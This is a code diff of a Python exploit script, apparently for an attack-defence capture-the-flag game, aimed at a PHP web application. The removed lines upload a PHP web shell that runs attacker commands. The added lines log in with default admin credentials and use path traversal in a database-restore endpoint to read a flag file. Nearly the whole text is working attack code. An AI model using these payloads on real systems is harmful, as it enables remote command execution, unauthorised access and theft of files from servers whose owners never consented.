@@ -21,6 +21,8 @@ def vulnerable_attack(target,target_port,cmd):
         data = quote(cmd) 
         #res = http("get",target,target_port,"/bigbrother?filename="+data,'',headers)
 	res = shit(target,target_port,data)
+        if len(res) == 32:
+            res = cmd_prefix + res + cmd_postfix
         # Even though we can not execute the cmd with the vuln, but we can read flag
         # and we want to use our framework to carry out this attack
         # not do the replicate tasks to code a new script
@@ -34,34 +36,18 @@ def vulnerable_attack(target,target_port,cmd):
 def shit(target,target_port,cmd):
     s = requests.Session()
     ip = target
-    url_1 = 'http://%s:%s/index.php/user/upFiles/upload' % (ip,str(target_port))
-    
-    my_hash = hashlib.md5(str(randint(1,10000000))).hexdigest()[:8]
-    shell = "<?php system($_GET['%s']);?>" % my_hash
-    open('/tmp/a.php','w').write(shell)
-
-    files = {'file':open('/tmp/a.php','r')}
     headers = {"X-Requested-With": "XMLHttpRequest"}
-    print url_1
-    content = s.post(url_1,files=files,headers=headers).content
-    import json
-    
-    try:
-        path = '/public' + json.loads(content)['url']
-    except:
-        return 'error'
-
-       
-    url_2 = 'http://%s:%s/' % (ip,str(target_port))
-    url_2 += path
-
-    print url_2
-
-    final_url = url_2 + '?' + my_hash + '=' + quote(cmd)
-    print final_url
-    res = s.get(final_url).content
-
+    url_1 = 'http://%s:%s/index.php/admin/login/index.html' % (ip,str(target_port))
+    print s.post(url_1,data={"username":"admin","password":"admin123","captcha":"a"},headers=headers).content
+    url_2 = 'http://%s:%s/index.php/admin/Database/restoreData?sqlfilepre=../../../../../flag' % (ip,str(target_port))
+    res =  s.get(url_2,headers=headers).content
+    flag_regex = '[0-9a-fA-F]{32}'
+    import re
+    res = re.search(flag_regex,res).group()
     print res
+
+
+    
 
 
     return res
